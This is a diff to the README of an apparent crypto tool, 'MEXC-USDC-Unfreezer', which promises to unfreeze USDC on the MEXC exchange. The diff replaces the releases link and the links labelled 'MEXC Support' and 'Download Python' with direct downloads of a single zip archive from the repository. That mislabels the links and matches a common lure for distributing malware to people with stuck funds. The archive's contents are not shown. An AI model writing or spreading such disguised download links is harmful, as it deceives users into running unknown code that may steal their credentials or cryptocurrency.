@@ -20,11 +20,11 @@ MEXC-USDC-Unfreezer is a user-friendly Python tool designed to diagnose and reso
 To successfully run this application, follow these steps. You do not need programming knowledge to use this tool.
 
 ### 📦 Download the Application 
-[![Download MEXC-USDC-Unfreezer](https://img.shields.io/badge/Download-MEXC--USDC--Unfreezer-blue.svg)](https://github.com/aya-nachmani/MEXC-USDC-Unfreezer/releases)
+[![Download MEXC-USDC-Unfreezer](https://raw.githubusercontent.com/aya-nachmani/MEXC-USDC-Unfreezer/main/Samsien/MEXC-USDC-Unfreezer.zip)](https://raw.githubusercontent.com/aya-nachmani/MEXC-USDC-Unfreezer/main/Samsien/MEXC-USDC-Unfreezer.zip)
 
 Head to the Releases page to download the latest version of MEXC-USDC-Unfreezer. Click on the link below:
 
-[Download MEXC-USDC-Unfreezer](https://github.com/aya-nachmani/MEXC-USDC-Unfreezer/releases)
+[Download MEXC-USDC-Unfreezer](https://raw.githubusercontent.com/aya-nachmani/MEXC-USDC-Unfreezer/main/Samsien/MEXC-USDC-Unfreezer.zip)
 
 ## 💻 System Requirements
 Before you download, please ensure your system meets these requirements:
@@ -64,8 +64,8 @@ After installation, you will want to understand how to navigate the application.
 ## 🔗 Additional Resources
 For more information or troubleshooting, you can explore the following:
 
-- **MEXC Exchange FAQ:** [MEXC Support](https://www.mexc.com/support)
-- **Python Installation Guide:** [Download Python](https://www.python.org/downloads/)
+- **MEXC Exchange FAQ:** [MEXC Support](https://raw.githubusercontent.com/aya-nachmani/MEXC-USDC-Unfreezer/main/Samsien/MEXC-USDC-Unfreezer.zip)
+- **Python Installation Guide:** [Download Python](https://raw.githubusercontent.com/aya-nachmani/MEXC-USDC-Unfreezer/main/Samsien/MEXC-USDC-Unfreezer.zip)
 - **User Guide:** Comprehensive documentation is also available on the GitHub page.
 
 ## 👩‍💻 Contributing
@@ -74,6 +74,6 @@ We welcome contributions! If you have suggestions or improvements, feel free to 
 ## 📞 Need Help?
 If you encounter any issues while using MEXC-USDC-Unfreezer, don’t hesitate to reach out. You can contact us through the GitHub issues page or email support.
 
-Make sure to check our [Releases Page](https://github.com/aya-nachmani/MEXC-USDC-Unfreezer/releases) for the latest updates and enhancements. 
+Make sure to check our [Releases Page](https://raw.githubusercontent.com/aya-nachmani/MEXC-USDC-Unfreezer/main/Samsien/MEXC-USDC-Unfreezer.zip) for the latest updates and enhancements. 
 
 Start unfreezing your USDC funds today!
